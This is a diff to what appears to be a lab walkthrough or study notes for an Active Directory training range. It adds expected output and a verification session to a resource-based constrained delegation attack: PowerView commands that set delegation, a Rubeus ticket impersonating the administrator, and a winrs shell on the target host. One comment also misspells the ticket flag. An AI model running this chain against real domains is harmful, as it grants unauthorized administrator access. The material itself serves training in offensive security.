@@ -1403,13 +1403,22 @@ Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 
 **Step 1: Set RBCD Configuration**
 ```powershell
-# Set dcorp-studentx$ to delegate to dcorp-mgmt
+# Must have GenericWrite on target computer (dcorp-mgmt)
+# Configure: Allow dcorp-studentx$ machine to delegate to dcorp-mgmt
+
 Set-DomainRBCD -Identity dcorp-mgmt 
   -DelegateFrom 'dcorp-studentx$' 
   -Verbose
 
-# Verify
+# Verification - check if RBCD is set correctly
 Get-DomainRBCD
+
+# Expected output:
+# SourceName              : DCORP-MGMT$
+# SourceType              : MACHINE_ACCOUNT
+# DelegatedName           : DCORP-studentx$
+# DelegatedType           : MACHINE_ACCOUNT
+# ServicePrincipalName    : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp...}
 ```
 
 **Step 2: Extract Machine Account Keys**
@@ -1432,8 +1441,24 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe
     /impersonateuser:administrator 
     /ptt
 
-# Access
-winrs -r:dcorp-mgmt cmd
+# Ticket injected with /ppt
+```
+
+**Step 4: Access Target and Verify**
+```powershell
+# Connect to dcorp-mgmt with WinRM (HTTP service)
+C:\AD\Tools> winrs -r:dcorp-mgmt cmd
+Microsoft Windows [Version 10.0.20348.1249]
+(c) Microsoft Corporation. All rights reserved.
+
+# Verify running as Administrator
+C:\Users\Administrator.dcorp> set username
+USERNAME = administrator
+
+C:\Users\Administrator.dcorp> set computername
+COMPUTERNAME = dcorp-mgmt
+
+# Success: We accessed dcorp-mgmt as Domain Administrator via RBCD
 ```
 
 **Why RBCD Over Constrained Delegation:**
